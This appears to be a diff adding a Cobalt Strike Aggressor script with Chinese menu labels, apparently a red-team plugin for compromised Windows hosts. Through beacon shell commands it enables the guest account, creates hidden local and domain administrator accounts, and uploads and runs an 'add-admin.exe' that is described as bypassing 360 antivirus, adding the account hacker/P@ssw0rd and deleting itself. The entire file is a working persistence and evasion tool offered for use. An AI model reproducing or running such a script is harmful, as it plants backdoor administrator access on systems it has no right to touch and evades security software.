@@ -1,0 +1,63 @@
+menu "添加用户" {
+  item "激活guest用户" {
+    $bid = $1['@'];
+    bshell($bid, "net user guest /active:yes");
+  }
+
+  item "创建管理员用户" {
+    $bid = $1['@'];
+    $Dialog = dialog("添加本地管理员用户",%(username => "zjun$", passwd => "admin@123.", "groups" => "administrators", bid => $bid),&add_localuser);
+    dialog_description($Dialog, "添加本地管理员用户，注意账户策略中的密码复杂度。");
+    drow_text($Dialog, "username", "username: ");
+    drow_text($Dialog, "passwd", "passwd: ");
+    drow_text($Dialog, "groups", "groups: ");
+    dbutton_action($Dialog, "运行");
+    dialog_show($Dialog);
+  }
+  sub add_localuser{
+    local('$Name');
+    $Name = $3['username'];
+    $Pwd = $3['passwd'];
+    $groups = $3['groups'];
+    bshell($bid, "net user $Name $Pwd /add && net localgroup $groups $Name /add");
+  }
+
+  item "添加域管用户"{
+    $bid = $1['@'];
+    $Dialog = dialog("添加域管",%(username => "zjun$",passswd => "admin@123.",bid => $bid),&add_domainuser);
+    dialog_description($Dialog, "添加域管理员用户，注意账户策略中的密码复杂度。");
+    drow_text($Dialog, "username", "username: ");
+    drow_text($Dialog, "passswd", "passswd: ");
+    dbutton_action($Dialog, "运行");
+    dialog_show($Dialog);
+  }
+  sub add_domainuser{
+    local('$Name');
+    $Name = $3['username'];
+    $Pwd = $3['passswd'];
+    bshell($bid, "net user $Name $Pwd /add /domain && net group \"Domain Admins\" $Name /add /domain");
+  }
+
+  menu "add-admin(bypass)"{
+    item "上传add-admin"{
+      local('$bid');
+      foreach $bid ($1){
+        bupload($1, script_resource("/scripts/Add user/add-admin.exe"));
+        blog($1, "项目地址：https://github.com/lengjibo/RedTeamTools/blob/master/windows/bypass360%E5%8A%A0%E7%94%A8%E6%88%B7/README.md")
+      }
+    }
+    item "运行add-admin" {
+      $bid = $1['@'];
+      $dialog = dialog("add-admin", %(bid => $bid), &add_admin);
+      dialog_description($dialog, "执行后自动添加一个账户进入管理员组，并自动删除程序。帐号：hacker 密码：P@ssw0rd，添加完成后及时修改账号名，过于招摇。");
+      dbutton_action($dialog, "运行");
+      dialog_show($dialog);
+    }
+    sub add_admin{
+      bshell($bid, "add-admin.exe");
+      bshell($bid, "del /f /s /q add-admin.exe");
+    }
+  }
+
+
+}
